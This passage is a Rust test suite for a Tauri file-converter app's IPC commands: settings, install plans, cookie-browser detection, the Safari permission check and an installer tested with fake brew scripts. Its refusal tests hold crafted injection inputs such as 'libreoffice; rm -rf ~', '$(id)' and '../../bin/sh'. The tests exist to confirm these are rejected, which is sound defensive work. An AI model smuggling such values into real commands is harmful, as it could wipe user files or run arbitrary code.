//! End-to-end IPC tests on Tauri's mock runtime.
//!
//! These drive the real command handlers through the real invoke pipeline (serde on both sides),
//! which is the only way to catch the mistakes that matter here: a renamed argument, a payload the
//! frontend cannot parse, or a command that was never registered in the handler list.

use crate::{configure, AppState};
use serde_json::{json, Value};
use tauri::test::{mock_builder, MockRuntime, INVOKE_KEY};
use tauri::webview::InvokeRequest;
use tauri::{
    ipc::CallbackFn, ipc::InvokeBody, Listener, Manager, WebviewWindow, WebviewWindowBuilder,
};

/// Redirect the config directory into a scratch folder exactly once per test binary: settings tests
/// must never touch the developer's real `~/.config` (and `set_var` is only safe before the other
/// test threads start reading the environment).
///
/// Keyed to the clock as well as the pid, and wiped on the way in. A pid is unique among *live*
/// processes only, the settings this binary saves outlive it, and `save_settings` writes them to
/// disk for real - so a run that inherited a pid inherited that run's `settings.json` too, and
/// `every_command_in_the_contract_is_registered_and_answers` read whichever preset the last run
/// happened to end on instead of the default it asserts. Every run gets its own empty folder now.
fn isolate_config_dir() {
    static ONCE: std::sync::Once = std::sync::Once::new();
    ONCE.call_once(|| {
        let stamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|since| since.as_nanos())
            .unwrap_or_default();
        let scratch =
            std::env::temp_dir().join(format!("cc-ipc-config-{}-{stamp}", std::process::id()));
        let _ = std::fs::remove_dir_all(&scratch);
        std::env::set_var("XDG_CONFIG_HOME", &scratch);
        std::env::set_var("HOME", &scratch);
    });
}

fn test_app() -> WebviewWindow<MockRuntime> {
    isolate_config_dir();

    // The *real* context (config, capabilities, ACL) on Tauri's mock runtime: anything the ACL
    // would block in production is blocked here too.
    let app = configure(mock_builder())
        .build(crate::app_context())
        .expect("failed to build the mock app");
    WebviewWindowBuilder::new(&app, "main", Default::default())
        .build()
        .expect("failed to build the mock webview")
}

fn invoke(webview: &WebviewWindow<MockRuntime>, cmd: &str, args: Value) -> Result<Value, Value> {
    let response = tauri::test::get_ipc_response(
        webview,
        InvokeRequest {
            cmd: cmd.into(),
            callback: CallbackFn(0),
            error: CallbackFn(1),
            // Same origin the real webview uses, so the request counts as "local" for the ACL
            // (a remote origin would be rejected before it ever reaches a command - by design).
            url: if cfg!(any(windows, target_os = "android")) {
                "http://tauri.localhost".parse().expect("valid url")
            } else {
                "tauri://localhost".parse().expect("valid url")
            },
            body: InvokeBody::Json(args),
            headers: Default::default(),
            invoke_key: INVOKE_KEY.to_string(),
        },
    );
    match response {
        Ok(body) => Ok(body.deserialize::<Value>().unwrap_or(Value::Null)),
        Err(err) => Err(err),
    }
}

#[test]
fn every_command_in_the_contract_is_registered_and_answers() {
    let webview = test_app();

    // 1. catalog
    let catalog = invoke(&webview, "get_catalog", json!({})).expect("get_catalog");
    assert!(catalog["categories"].as_array().map(|c| c.len()) == Some(6), "{catalog}");
    assert_eq!(catalog["presets"].as_array().map(|p| p.len()), Some(4));
    assert!(catalog["input_extension_count"].as_u64().unwrap_or(0) > 150);
    assert!(catalog["tools"].as_array().is_some());

    // 2/3. settings round trip
    //
    // The defaults are *written* before they are read back, rather than trusted to be what was on
    // disk when this app was built. `isolate_config_dir` hands the whole binary one config dir, and
    // several tests in it save settings for real - so whichever of them ran first was in the file
    // this app loaded at startup, and reading "the default preset" here was a coin flip on thread
    // order (it came back `smallest` often enough to fail the suite). What the defaults *are* is
    // pinned in `convert_core::settings`; what this test is for is that these two commands are
    // registered, speak the frontend's shapes, and agree with each other.
    let defaults =
        serde_json::to_value(convert_core::Settings::default()).expect("default settings");
    let settings = invoke(&webview, "save_settings", json!({ "settings": defaults }))
        .expect("save_settings(defaults)");
    assert_eq!(settings["preset"], json!("web_and_demo"));
    let mut edited = settings.clone();
    edited["image"]["quality"] = json!(61);
    let saved =
        invoke(&webview, "save_settings", json!({ "settings": edited })).expect("save_settings");
    assert_eq!(saved["image"]["quality"], json!(61));
    let reloaded = invoke(&webview, "get_settings", json!({})).expect("get_settings");
    assert_eq!(reloaded["image"]["quality"], json!(61), "settings must persist in state");

    // 4. presets - snake_case *and* camelCase argument spellings must both work.
    let smallest = invoke(&webview, "apply_preset", json!({ "preset_id": "smallest" }))
        .expect("apply_preset(snake_case)");
    assert_eq!(smallest["preset"], json!("smallest"));
    assert_eq!(smallest["video"]["max_height"], json!(720));
    let hq = invoke(&webview, "apply_preset", json!({ "presetId": "high_quality" }))
        .expect("apply_preset(camelCase)");
    assert_eq!(hq["preset"], json!("high_quality"));
    assert!(invoke(&webview, "apply_preset", json!({ "preset_id": "nope" })).is_err());

    // 8. tools
    let tools = invoke(&webview, "refresh_tools", json!({})).expect("refresh_tools");
    // The count follows the catalog (Ghostscript was dropped when nothing depended on it any
    // more), so assert against the list itself instead of a number that goes stale.
    assert_eq!(
        tools.as_array().map(|t| t.len()),
        Some(convert_core::tools::ALL_TOOLS.len()),
        "{tools}"
    );
    assert!(tools[0]["id"].is_string() && tools[0]["available"].is_boolean());

    // 9. install plans - one per *package*, whose `tool_ids` join onto the status list above
    let plans = invoke(&webview, "get_install_plans", json!({})).expect("get_install_plans");
    let plans = plans.as_array().cloned().unwrap_or_default();
    let plan_ids: Vec<&str> = plans.iter().filter_map(|p| p["package_id"].as_str()).collect();
    assert_eq!(
        plan_ids,
        ["libreoffice", "pandoc", "imagemagick", "poppler", "ruffle", "yt-dlp", "deno"],
        "{plans:#?}"
    );
    let tool_list = tools.as_array().cloned().unwrap_or_default();
    let status_ids: Vec<&str> = tool_list.iter().filter_map(|t| t["id"].as_str()).collect();
    for plan in &plans {
        for key in [
            "package_id",
            "name",
            "tool_ids",
            "manager",
            "manager_available",
            "command",
            "needs_admin",
            "can_auto_install",
            "unlocks",
        ] {
            assert!(plan.get(key).is_some(), "`{key}` is missing from {plan}");
        }
        assert!(plan["unlocks"].as_array().map(|u| !u.is_empty()).unwrap_or(false), "{plan}");
        assert!(plan["manager_available"].is_boolean() && plan["can_auto_install"].is_boolean());
        // Every member binary is a row in the tool list: that join is how the UI tells a complete
        // package from a half-installed one, since a plan says nothing about presence.
        let members: Vec<&str> = plan["tool_ids"]
            .as_array()
            .expect("tool_ids")
            .iter()
            .filter_map(|t| t.as_str())
            .collect();
        assert!(!members.is_empty(), "{plan}");
        for member in &members {
            assert!(status_ids.contains(member), "`{member}` is not in the tool list: {tools}");
        }
        // The name a person reads is the package's, and no user-facing field spells a binary out.
        for field in ["name", "command"] {
            let text = plan[field].as_str().unwrap_or_default();
            assert!(!text.contains("pdfto"), "{field} names a binary: {plan}");
        }
        for line in plan["unlocks"].as_array().expect("unlocks") {
            assert!(!line.as_str().unwrap_or_default().contains("pdfto"), "{plan}");
        }
    }
    // Poppler is one row with one command, not one row per binary it ships.
    let poppler = plans.iter().find(|p| p["package_id"] == json!("poppler")).expect("poppler plan");
    assert_eq!(poppler["name"], json!("Poppler"));
    assert_eq!(poppler["tool_ids"].as_array().map(|t| t.len()), Some(3), "{poppler}");
    // One command for all three binaries, where there is a manager to run it. On a platform this
    // build cannot drive the row still exists - it just has nothing to offer but the hint.
    #[cfg(target_os = "macos")]
    assert_eq!(poppler["command"], json!("brew install poppler"), "{poppler}");
    #[cfg(not(target_os = "macos"))]
    assert_eq!(poppler["command"], json!(""), "{poppler}");
    // FFmpeg ships inside the bundle and `sips` is part of macOS: neither is ever offered at all.
    for built_in in ["ffmpeg", "ffprobe", "sips"] {
        assert!(status_ids.contains(&built_in), "{built_in} is still a tool row: {tools}");
        assert!(
            !plans.iter().any(|p| p["package_id"] == json!(built_in)
                || p["tool_ids"].as_array().is_some_and(|ids| ids.contains(&json!(built_in)))),
            "{built_in} must not be installable: {plans:#?}"
        );
    }

    // 10. a package id that is not in the allowlist is refused, whatever it is dressed up as
    for crafted in [
        json!("libreoffice; rm -rf ~"),
        json!("brew"),
        json!("$(id)"),
        json!(""),
        json!("../../bin/sh"),
        // A *binary* id is not an install key either: one click is one package.
        json!("pdftohtml"),
    ] {
        let refused = invoke(&webview, "install_tool", json!({ "package_id": crafted.clone() }));
        assert!(refused.is_err(), "`{crafted}` must not be installable");
    }
    // ...and the camelCase spelling of the argument reaches the same allowlist.
    assert!(invoke(&webview, "install_tool", json!({ "packageId": "not_a_package" })).is_err());
    // A missing argument is a rejected promise, not a panic.
    assert!(invoke(&webview, "install_tool", json!({})).is_err());
    // The old per-binary spelling is gone: an argument named `tool_id` no longer reaches anything.
    assert!(invoke(&webview, "install_tool", json!({ "tool_id": "pandoc" })).is_err());
    // Nothing above may have latched the single-install guard.
    assert!(!webview.state::<AppState>().is_installing(), "a refusal must not claim the slot");

    // 7. cancelling while idle is a no-op, never an error
    assert!(invoke(&webview, "cancel_batch", json!({})).is_ok());

    // 11/12. the two commands the sign-in recovery flow is built on. Both are answered with the
    // machine as it is; neither may reach the network here, which is why the check is asked while
    // the settings say "no cookies" (see the tests below for what each of them promises).
    let browsers =
        invoke(&webview, "list_cookie_browsers", json!({})).expect("list_cookie_browsers");
    assert!(browsers.as_array().is_some_and(|b| !b.is_empty()), "{browsers}");
    let nothing_to_check = invoke(&webview, "test_cookie_source", json!({ "settings": reloaded }))
        .expect("test_cookie_source");
    assert_eq!(nothing_to_check["result"], json!("not_configured"), "{nothing_to_check}");

    // 6. an empty batch is rejected instead of emitting a stray batch_finished
    assert!(invoke(&webview, "start_batch", json!({ "items": [], "settings": reloaded })).is_err());
}

/// `list_cookie_browsers`: the whole allowlist, the evidence behind each row, and one ranking.
///
/// This is what lets the recovery flow say "Use your Safari sign-in" instead of opening a dropdown
/// of eight browsers on a Mac that has one. It answers from the disk, so what it *says* depends on
/// the machine; what this pins is the shape, the honesty of the shape, and the one thing it must
/// never do - read a cookie to fill a field in.
#[test]
fn the_browser_list_carries_the_evidence_and_one_ranking_over_the_whole_allowlist() {
    let webview = test_app();
    let rows = invoke(&webview, "list_cookie_browsers", json!({})).expect("list_cookie_browsers");
    let rows = rows.as_array().cloned().unwrap_or_default();

    // One row per allowlisted browser, in allowlist order: a filtered list would make "you have
    // Chrome" and "you have nothing we can borrow from" look like the same answer.
    let ids: Vec<&str> = rows.iter().filter_map(|r| r["id"].as_str()).collect();
    assert_eq!(ids, convert_core::settings::COOKIE_BROWSERS.to_vec(), "{rows:#?}");

    for row in &rows {
        for key in [
            "id",
            "label",
            "installed",
            "app_path",
            "is_default",
            "cookie_store",
            "cookie_store_exists",
            "cookie_store_bytes",
            "cookie_store_modified",
            "needs_full_disk_access",
            "rank",
            "recommended",
        ] {
            assert!(row.get(key).is_some(), "`{key}` is missing from {row}");
        }
        assert!(row["installed"].is_boolean(), "{row}");
        // Every cookie-store field answers from `stat` alone, so a store that is not there says so
        // in all four places at once rather than reporting a zero-byte file that does not exist.
        assert!(row["cookie_store_exists"].is_boolean(), "{row}");
        if row["cookie_store_exists"] == json!(true) {
            assert!(row["cookie_store"].is_string(), "{row}");
            assert!(row["cookie_store_bytes"].is_u64(), "{row}");
        } else {
            assert_eq!(row["cookie_store"], json!(null), "{row}");
            assert_eq!(row["cookie_store_bytes"], json!(null), "{row}");
            assert_eq!(row["cookie_store_modified"], json!(null), "{row}");
        }
        // Safari's jar, and only Safari's, costs a permission - a fact for the sentence, never a
        // place in the order.
        assert_eq!(row["needs_full_disk_access"], json!(row["id"] == json!("safari")), "{row}");
        // Nothing may be offered that could only fail.
        if row["recommended"] == json!(true) {
            assert_eq!(row["rank"], json!(1), "{row}");
            assert_eq!(row["installed"], json!(true), "{row}");
            assert_eq!(row["cookie_store_exists"], json!(true), "{row}");
        }
        let label = row["label"].as_str().unwrap_or_default();
        assert!(!label.is_empty() && !label.contains(".app"), "a label is for a sentence: {row}");
        // Found or not found, and never both: a path is the evidence for the boolean.
        if row["installed"] == json!(true) {
            let path = row["app_path"].as_str().unwrap_or_default();
            assert!(path.ends_with(".app"), "{row}");
            assert!(std::path::Path::new(path).exists(), "{row}");
        } else {
            assert_eq!(row["app_path"], json!(null), "{row}");
        }
        // The id is what goes into `settings.link.cookie_browser`, so it has to be the allowlist's
        // own spelling rather than the label's.
        let id = row["id"].as_str().unwrap_or_default();
        assert_eq!(convert_core::settings::cookie_browser(id), Some(id), "{row}");
    }

    // One ranking over the whole list: every place from 1 to n, used once. The frontend sorts by
    // `rank` and offers `recommended`; it never has to invent an order of its own.
    let mut ranks: Vec<u64> = rows.iter().filter_map(|r| r["rank"].as_u64()).collect();
    ranks.sort_unstable();
    assert_eq!(ranks, (1..=rows.len() as u64).collect::<Vec<_>>(), "{rows:#?}");
    assert!(rows.iter().filter(|r| r["recommended"] == json!(true)).count() <= 1, "{rows:#?}");

    // At most one default, and it is decided by LaunchServices rather than guessed. A Mac whose
    // owner never changed the default records no `https` handler at all, which *is* the answer:
    // Safari. The old payload claimed no default anywhere and called it unknowable.
    let defaults: Vec<&str> = rows
        .iter()
        .filter(|r| r["is_default"] == json!(true))
        .filter_map(|r| r["id"].as_str())
        .collect();
    assert!(defaults.len() <= 1, "{rows:#?}");

    // Safari is on the list on every Mac, and is the one browser that is neither installable nor
    // removable - so if this build is running on macOS at all, its row is a found one.
    #[cfg(target_os = "macos")]
    {
        let safari = rows.iter().find(|r| r["id"] == json!("safari")).expect("safari");
        assert_eq!(safari["installed"], json!(true), "{safari}");
        assert_eq!(safari["app_path"], json!("/Applications/Safari.app"), "{safari}");
        // This machine's own LaunchServices answer, whatever it is, is the one on the row.
        let expected = crate::launch_services::default_browser();
        assert_eq!(defaults.first().copied(), expected, "{rows:#?}");
    }
}

/// `test_cookie_source`: the answer the old message could not give, and what it refuses to run.
///
/// The three verdicts that need a network round trip are pinned in `convert_core::link`, where the
/// probe's outcome is injected instead of fetched. What is asserted here is everything that must
/// happen *without* one: nothing configured is a state and not a failure, and a source that would
/// never reach yt-dlp is refused in the settings page's own words rather than reported as a broken
/// sign-in.
#[test]
fn a_sign_in_check_with_nothing_to_check_says_so_without_touching_the_network() {
    let webview = test_app();
    let settings = |link: Value| {
        let mut s = serde_json::to_value(convert_core::Settings::default()).expect("settings");
        s["link"] = link;
        json!({ "settings": s })
    };

    // Off, which is the default: no probe, no waiting, and a sentence that offers the two ways in.
    let idle = invoke(&webview, "test_cookie_source", settings(json!({ "cookies": "none" })))
        .expect("nothing configured is not an error");
    assert_eq!(idle["result"], json!("not_configured"));
    assert_eq!(idle["ok"], json!(false));
    assert_eq!(idle["message"], json!(crate::commands::NO_COOKIE_SOURCE_TO_TEST));
    // What was tried is named, so the UI never has to invent a URL of its own to say it.
    assert_eq!(idle["tested_url"], json!(convert_core::link::COOKIE_TEST_URL));

    // A browser that is not on the allowlist is refused here exactly as it is refused for a batch:
    // it can never become a `--cookies-from-browser` value, so there is nothing to test.
    let crafted = invoke(
        &webview,
        "test_cookie_source",
        settings(json!({ "cookies": "browser", "cookie_browser": "chrome; rm -rf ~" })),
    )
    .expect_err("that name must never reach a command line");
    let crafted = crafted.as_str().unwrap_or_default().to_string();
    assert!(crafted.contains("cannot take a sign-in from that browser"), "{crafted}");

    // Half-finished is held rather than judged: "from a browser" with nothing chosen yet is a
    // sentence the user has not finished, and the answer says what is missing.
    let unfinished = invoke(
        &webview,
        "test_cookie_source",
        settings(json!({ "cookies": "browser", "cookie_browser": "" })),
    )
    .expect_err("there is no browser to check");
    let unfinished = unfinished.as_str().unwrap_or_default().to_string();
    assert!(unfinished.contains("Choose which browser"), "{unfinished}");

    // A cookies.txt that is not there is the other refusal, and it names the file: the user chose
    // that path themselves, and what is *inside* the file is never read by anything in this app.
    let gone = std::env::temp_dir().join("cc-not-a-cookies-file.txt");
    let _ = std::fs::remove_file(&gone);
    let missing = invoke(
        &webview,
        "test_cookie_source",
        settings(json!({ "cookies": "file", "cookie_file": gone })),
    )
    .expect_err("there is no file to read");
    let missing = missing.as_str().unwrap_or_default().to_string();
    assert!(missing.contains("is not there"), "{missing}");
    assert!(missing.contains("cookies.txt"), "{missing}");

    // None of the refusals above may have started a batch or an install.
    let state = webview.state::<AppState>();
    assert!(!state.is_installing() && !state.activity().converting, "a check is not a batch");
}

/// `check_safari_cookie_access`: the Safari question, answered from this machine in microseconds.
///
/// The only route to this answer used to be the network probe below - run yt-dlp with
/// `--cookies-from-browser safari` against a public video and wait up to twenty seconds to be told
/// what `open(2)` says immediately. Safari's jar lives behind Full Disk Access, so the operating
/// system's answer to "may I have a handle?" *is* the answer to "do we have the permission?".
///
/// What this pins is the shape, the honesty, and the speed - and that the answer costs no cookies:
/// the payload has room for a verdict, a sentence and a path, and nowhere for a cookie to sit.
#[test]
fn the_safari_permission_is_answered_from_this_machine_without_a_probe() {
    let webview = test_app();
    let started = std::time::Instant::now();
    let answer = invoke(&webview, "check_safari_cookie_access", json!({}))
        .expect("check_safari_cookie_access");

    // Faster than the probe it replaces, by orders of magnitude: this is an `open` and a `drop`.
    assert!(
        started.elapsed() < std::time::Duration::from_secs(2),
        "a local open must not take {:?}",
        started.elapsed()
    );

    // Exactly four verdicts, and the payload is those four fields and nothing else.
    let result = answer["result"].as_str().unwrap_or_default().to_string();
    assert!(
        ["readable", "needs_full_disk_access", "no_cookie_store", "unreadable"]
            .contains(&result.as_str()),
        "{answer}"
    );
    assert_eq!(answer["ok"], json!(result == "readable"), "{answer}");
    let keys: Vec<&String> = answer.as_object().map(|o| o.keys().collect()).unwrap_or_default();
    assert_eq!(keys, ["cookie_store", "message", "ok", "result"], "{answer}");

    // The sentence is one of the four the core writes - the UI never has to compose its own.
    let message = answer["message"].as_str().unwrap_or_default().to_string();
    assert!(!message.is_empty() && message.ends_with('.'), "{answer}");
    if result == "needs_full_disk_access" {
        assert_eq!(
            message,
            convert_core::link::FetchFailure::SafariNeedsFullDiskAccess.to_string(),
            "the permission is explained in one place only"
        );
    }

    // The file is named, never quoted: the path is a diagnostic, and the bytes stay on disk.
    if let Some(path) = answer["cookie_store"].as_str() {
        assert!(path.ends_with("Cookies.binarycookies"), "{answer}");
    }

    // On the Mac this feature comes from the answer is `needs_full_disk_access` - the jar is there
    // and `stat`s, and `open` gets `[Errno 1] Operation not permitted` - and on a machine with no
    // Safari at all it is `no_cookie_store`. Both are verdicts; neither is an error.
    #[cfg(not(target_os = "macos"))]
    assert_eq!(result, "no_cookie_store", "{answer}");

    // And the check that used to need twenty seconds now short-circuits on the same fact: a Safari
    // source whose jar cannot be opened is answered before anything is spawned.
    let mut settings = serde_json::to_value(convert_core::Settings::default()).expect("settings");
    settings["link"] = json!({ "cookies": "browser", "cookie_browser": "safari" });
    let started = std::time::Instant::now();
    let checked = invoke(&webview, "test_cookie_source", json!({ "settings": settings }))
        .expect("test_cookie_source(safari)");
    if result != "readable" {
        assert_eq!(checked["result"], json!("unreadable"), "{checked}");
        assert_eq!(checked["ok"], json!(false), "{checked}");
        assert_eq!(checked["message"], json!(message), "one cause, one sentence: {checked}");
        assert!(
            started.elapsed()
                < std::time::Duration::from_secs(convert_core::link::COOKIE_TEST_TIMEOUT_SECS),
            "no probe may be spawned for a jar that will not open: {:?}",
            started.elapsed()
        );
    }
}

/// `open_full_disk_access_settings`: the one command that opens a *URL*, and the one that takes
/// nothing at all.
///
/// A pasted link whose sign-in comes from Safari cannot be fixed by anything this app is allowed to
/// do - macOS keeps that cookie jar behind Full Disk Access - so the failed row offers the trip to
/// the pane that grants it. `open_path` can allowlist the path the webview sends it because a
/// converted file is a thing with an extension; a settings URL is not, so the argument is removed
/// instead of being checked, and this test is what says so out loud.
///
/// Not invoked on macOS, where answering it means System Settings taking over the screen mid-test.
/// `reveal_in_finder` and `open_path` are left out of the contract walk above for the same reason:
/// their side effect *is* the answer.
#[test]
fn full_disk_access_opens_one_hardcoded_pane_and_takes_no_argument() {
    // The whole of what can be asserted about *what* opens, because the address is a constant.
    // The pre-Ventura spelling is the deliberate one: System Settings still declares it as this
    // pane's `legacyBundleIdentifier` (checked on macOS 26.6), and it is the only address that also
    // resolves on the macOS 11 and 12 machines this app ships to. See `FULL_DISK_ACCESS_PANE`.
    assert_eq!(
        crate::commands::FULL_DISK_ACCESS_PANE,
        "x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles"
    );
    // Handed to `open` as one argv entry: no space to split on, and nothing a shell would read.
    assert!(!crate::commands::FULL_DISK_ACCESS_PANE.contains(char::is_whitespace));

    #[cfg(not(target_os = "macos"))]
    {
        let webview = test_app();
        // Registered and reached: an unregistered command comes back "not found", and this one
        // answers in its own words - which off macOS are that the permission does not exist here.
        let refused = invoke(&webview, "open_full_disk_access_settings", json!({}))
            .expect_err("there is no such pane off macOS");
        let text = refused.as_str().unwrap_or_default().to_string();
        assert!(text.contains("macOS permission"), "{text}");
        // A URL sent anyway changes nothing: the command has nowhere to put one, so the answer is
        // the same answer and no address from the webview can ever reach `open`.
        let smuggled = invoke(
            &webview,
            "open_full_disk_access_settings",
            json!({ "url": "x-apple.systempreferences:com.apple.preference.Bluetooth" }),
        )
        .expect_err("the argument is ignored, not honoured");
        assert_eq!(smuggled, refused, "an argument must make no difference at all");
    }
}

/// A bundled or OS-provided helper has no installer, and `install_tool` must say so rather than
/// spawning something. Neither is a *package*, so the id it is asked with is the binary's - the only
/// spelling a stale frontend could still send.
///
/// Nothing here asks for a package that *is* installable: on a developer's Mac with Homebrew present
/// that would really download LibreOffice. The refusal paths that depend on the machine ("Homebrew
/// is not installed", "not on this platform") are pinned in `convert_core::install`, where the
/// platform answers are injected instead of probed.
#[test]
fn install_tool_refuses_what_it_cannot_install() {
    let webview = test_app();

    for bundled in ["ffmpeg", "ffprobe", "sips"] {
        let err = invoke(&webview, "install_tool", json!({ "package_id": bundled }))
            .expect_err("there is nothing to install");
        let err = err.as_str().unwrap_or_default().to_string();
        assert!(err.contains("nothing to install"), "{bundled}: {err}");
    }
    // A member binary of a real package is refused too, and told what to ask for instead - by name,
    // so the message is one a person can act on.
    for member in ["pdftoppm", "pdftotext", "pdftohtml"] {
        let err = invoke(&webview, "install_tool", json!({ "package_id": member }))
            .expect_err("a binary id is not an install key");
        let err = err.as_str().unwrap_or_default().to_string();
        assert!(err.contains("Poppler"), "{member}: {err}");
        assert!(err.contains("brew install poppler"), "{member}: {err}");
    }
    assert!(!webview.state::<AppState>().is_installing(), "a refusal must not claim the slot");
}

/// Two `brew install` runs at once fight over Homebrew's own lock and interleave their `log` events
/// into one unreadable stream, so the slot is single-flight - and, like the batch slot, keyed to an
/// id so a finished install's late release cannot free its successor's.
#[test]
fn only_one_install_runs_at_a_time_and_a_late_release_is_harmless() {
    let app = configure(mock_builder())
        .build(crate::app_context())
        .expect("failed to build the mock app");
    let state = app.state::<AppState>();

    let first = state.begin_install().expect("the first install may start");
    assert!(state.is_installing());
    assert!(state.begin_install().is_err(), "a second install must be refused");

    state.end_install(first);
    assert!(!state.is_installing());

    let second = state.begin_install().expect("the next install may start");
    assert_ne!(first, second, "each install needs its own id to release its own slot");
    // The first install's `Drop` guard runs late, after its successor claimed the slot.
    state.end_install(first);
    assert!(state.is_installing(), "a late release must not free the running install's slot");
    assert!(state.begin_install().is_err());

    state.end_install(second);
    assert!(!state.is_installing(), "the owner can always release");
}

/// The `install://event` contract the settings page listens to: `started` first, every line of the
/// installer's output as a `log` (stdout *and* stderr, merged), `finished` last - and `ok` only when
/// the helper is genuinely discoverable afterwards.
#[test]
fn an_install_streams_merged_output_and_ends_with_exactly_one_finished_event() {
    let webview = test_app();
    let app = webview.app_handle().clone();

    let dir = std::env::temp_dir().join(format!("cc-ipc-install-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("mkdir");
    // Stand-in for `brew`: talks on both pipes, redraws a progress bar, then succeeds.
    let fake_brew = dir.join("brew");
    std::fs::write(
        &fake_brew,
        "#!/bin/sh\necho '==> Fetching pandoc'\necho 'Warning: from stderr' 1>&2\nprintf ' 10%%\\r100%%\\n'\nexit 0\n",
    )
    .expect("write fake brew");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&fake_brew, std::fs::Permissions::from_mode(0o755))
            .expect("chmod");
    }

    let events: std::sync::Arc<std::sync::Mutex<Vec<Value>>> = Default::default();
    let sink = events.clone();
    app.listen(crate::INSTALL_EVENT, move |event| {
        if let Ok(value) = serde_json::from_str::<Value>(event.payload()) {
            sink.lock().expect("event lock").push(value);
        }
    });

    let command = convert_core::install::InstallCommand {
        package: &convert_core::package::PANDOC,
        program: fake_brew,
        args: vec!["install", "pandoc"],
        env: vec![],
        needs_admin: false,
        display: "brew install pandoc".into(),
    };

    // Pass 1: the installer succeeds but the tool is still not discoverable. That is *not* success.
    let id = app.state::<AppState>().begin_install().expect("slot");
    crate::install::run_with(app.clone(), command.clone(), id, || |_| false);

    let collected = events.lock().expect("event lock").clone();
    let kinds: Vec<&str> = collected.iter().filter_map(|e| e["type"].as_str()).collect();
    assert_eq!(kinds.first(), Some(&"started"), "{collected:#?}");
    assert_eq!(kinds.last(), Some(&"finished"), "{collected:#?}");
    assert_eq!(kinds.iter().filter(|k| **k == "finished").count(), 1, "{collected:#?}");
    // Every event carries the *package* id the frontend sent, so a row can match them to its button.
    assert!(collected.iter().all(|e| e["package_id"] == json!("pandoc")), "{collected:#?}");
    assert!(collected.iter().all(|e| e.get("tool_id").is_none()), "{collected:#?}");

    let lines: Vec<&str> = collected
        .iter()
        .filter(|e| e["type"] == json!("log"))
        .filter_map(|e| e["line"].as_str())
        .collect();
    assert!(lines.contains(&"==> Fetching pandoc"), "stdout is missing: {lines:?}");
    assert!(lines.contains(&"Warning: from stderr"), "stderr must be merged in: {lines:?}");
    assert!(lines.contains(&"100%"), "a redrawn progress line must arrive collapsed: {lines:?}");

    let finished = collected.last().expect("finished");
    assert_eq!(finished["ok"], json!(false), "exit 0 is not proof the helper is there");
    let message = finished["message"].as_str().unwrap_or_default();
    assert!(message.contains("Pandoc is not in any of the places"), "{message}");
    assert!(message.contains("Re-check"), "{message}");
    // The slot was released, and released before the UI was told the install was over.
    assert!(!app.state::<AppState>().is_installing(), "the install slot is stuck");

    // Pass 2: same installer, but now discovery finds the helper afterwards.
    events.lock().expect("event lock").clear();
    let id = app.state::<AppState>().begin_install().expect("slot");
    crate::install::run_with(app.clone(), command, id, || |_| true);
    let collected = events.lock().expect("event lock").clone();
    let finished = collected.last().expect("finished");
    assert_eq!(finished["type"], json!("finished"));
    assert_eq!(finished["ok"], json!(true), "{collected:#?}");
    assert!(
        finished["message"].as_str().unwrap_or_default().contains("Pandoc is installed"),
        "{finished}"
    );

    let _ = std::fs::remove_dir_all(&dir);
}

/// A stand-in for `brew`: a shell script that does whatever an installer needs to do in a test, put
/// where a resolved package manager would be. Executable, because the point is that we spawn it.
fn fake_installer(dir: &std::path::Path, script: &str) -> std::path::PathBuf {
    std::fs::create_dir_all(dir).expect("mkdir");
    let program = dir.join("brew");
    std::fs::write(&program, script).expect("write fake brew");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    }
    program
}

/// The one command a fake `brew` needs, aimed at a package this machine is guaranteed not to have.
fn install_command(program: std::path::PathBuf) -> convert_core::install::InstallCommand {
    convert_core::install::InstallCommand {
        package: &convert_core::package::YT_DLP,
        program,
        args: vec!["install", "yt-dlp"],
        env: vec![],
        needs_admin: false,
        display: "brew install yt-dlp".into(),
    }
}

/// The bug a user actually hit, and the reason `run_with` takes a probe *factory*: they clicked
/// Install for yt-dlp, Homebrew really did install it, and the app answered "the installer
/// finished, but we still cannot find it - run `brew install yt-dlp` in Terminal to see what it
/// did", which told them it was already installed. The scan that answered "is it there now?" had
/// been taken *before* the installer ran, and a snapshot of a machine without yt-dlp on it can only
/// ever say "absent" - so a genuinely fresh, genuinely successful install came out
/// `NotDiscoverable`.
///
/// The fake machine here behaves like the real one did: the directory the probe looks in is empty
/// when the install starts and holds `yt-dlp` when the installer exits. Move the scan back in front
/// of `stream` and this reports `ok: false`.
#[test]
fn a_helper_that_only_appears_while_the_installer_runs_is_reported_as_installed() {
    let webview = test_app();
    let app = webview.app_handle().clone();

    let dir = std::env::temp_dir().join(format!("cc-ipc-install-late-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    // The only place this test's probe ever looks, so it is the whole "filesystem" as far as the
    // install is concerned - and it starts out without yt-dlp in it, like the user's Mac did.
    let bin = dir.join("bin");
    std::fs::create_dir_all(&bin).expect("mkdir");
    let landed = bin.join("yt-dlp");
    let program = fake_installer(
        &dir,
        &format!(
            "#!/bin/sh\n\
             echo '==> Fetching yt-dlp'\n\
             printf '#!/bin/sh\\nexit 0\\n' > '{path}'\n\
             chmod 755 '{path}'\n\
             echo '🍺  yt-dlp: 4 files'\n\
             exit 0\n",
            path = landed.display()
        ),
    );
    assert!(!landed.exists(), "the fake machine must not have yt-dlp before the installer runs");

    let events: std::sync::Arc<std::sync::Mutex<Vec<Value>>> = Default::default();
    let sink = events.clone();
    app.listen(crate::INSTALL_EVENT, move |event| {
        if let Ok(value) = serde_json::from_str::<Value>(event.payload()) {
            sink.lock().expect("event lock").push(value);
        }
    });

    let id = app.state::<AppState>().begin_install().expect("slot");
    let probe_dir = bin.clone();
    crate::install::run_with(app.clone(), install_command(program), id, move || {
        // One scan of the fake machine, taken when the factory is called - which is the thing under
        // test. Nothing in this closure runs before `run_with` decides to run it.
        let present: Vec<std::ffi::OsString> = std::fs::read_dir(&probe_dir)
            .expect("read the fake machine")
            .filter_map(|entry| entry.ok())
            .map(|entry| entry.file_name())
            .collect();
        move |tool: convert_core::Tool| present.iter().any(|name| name == tool.id())
    });

    assert!(landed.exists(), "the fake installer did not install anything");
    let collected = events.lock().expect("event lock").clone();
    let finished = collected.last().expect("finished");
    assert_eq!(finished["type"], json!("finished"));
    let message = finished["message"].as_str().unwrap_or_default();
